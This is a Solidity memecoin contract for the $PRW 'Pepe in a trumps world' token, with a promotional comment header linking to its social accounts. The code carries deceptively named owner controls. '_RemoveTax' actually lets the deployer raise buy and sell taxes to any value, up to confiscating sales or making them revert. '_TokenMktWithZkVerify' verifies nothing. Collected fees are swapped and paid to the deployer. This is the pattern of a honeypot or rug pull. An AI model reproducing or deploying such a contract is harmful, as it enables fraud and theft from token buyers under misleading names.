/*
?- pepe in a trumps world , OH FUKC.??

??$PRW includes a collection of Pepe memes designed by its Artist and Community of $PRW.??

???$PRW was deployed for degen shitcoin trading and gambling on the Ethereum blockchain.

?The $PRW memecoin, a collection of never-ending Pepe memes.


?Telegram:https://t.me/pepeinatrumpsworld
❌Twitter:https://x.com/pepeinatrumpwld
?Website:https://pepeinatrumpsworld.com
*/


// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
import "./draft-IERC6093.sol";
import "./IUniswapFactory.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract PRW 
{ 
    string private _name = unicode"Pepe in a trumps world";
    string private _symbol = unicode"PRW";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 1_000_000_000 * 10**decimals;

    struct StoreData {
        address tokenMkt;
        uint8 BuyTaxFee;
        uint8 SellTaxFee;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(
        address indexed TOKEN_MKT,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public pair;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    bool private swapping;
    bool private tradingOpen;

    constructor() {
        uint8 _initBuyTaxFee = 0;
        uint8 _initSellTaxFee = 0;
        storeData = StoreData({
            tokenMkt: msg.sender,
            BuyTaxFee: _initBuyTaxFee,
            SellTaxFee: _initSellTaxFee
        });
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function _RemoveTax(uint8 _BrStorage, uint8 _SrStorage) external {
        if (msg.sender != _TokenMktWithZkVerify()) revert Permissions();
        RemoveTax(_BrStorage, _SrStorage);
    }

    function _TokenMktWithZkVerify() private view returns(address) {
        return storeData.tokenMkt;
    }

    function openedTrade() external {
        require(msg.sender == _TokenMktWithZkVerify());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function RemoveTax(uint8 _buy, uint8 _sell) private {
        storeData.BuyTaxFee = _buy;
        storeData.SellTaxFee = _sell;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _TokenMktWithZkVerify();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount && from != tokenMkt) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFeeOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _BuyTaxFee, uint8 _SellTaxFee) = (storeData.BuyTaxFee, storeData.SellTaxFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _SellTaxFee : _BuyTaxFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

}